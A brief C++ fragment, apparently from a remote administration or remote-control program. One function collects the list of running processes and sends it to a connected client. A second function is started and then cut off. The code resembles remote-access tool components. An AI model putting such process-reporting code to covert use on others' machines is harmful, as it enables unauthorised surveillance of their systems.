VOID CSystemManager::SendProcessList()
{
	LPBYTE	szBuffer = GetProcessList();            //得到进程列表的数据
	if (szBuffer == NULL)
		return;	
	m_ClientObject->OnServerSending((char*)szBuffer, LocalSize(szBuffer));  
	LocalFree(szBuffer);

	szBuffer = NULL;
}

void CSystemManager::SendWindowsList()
{
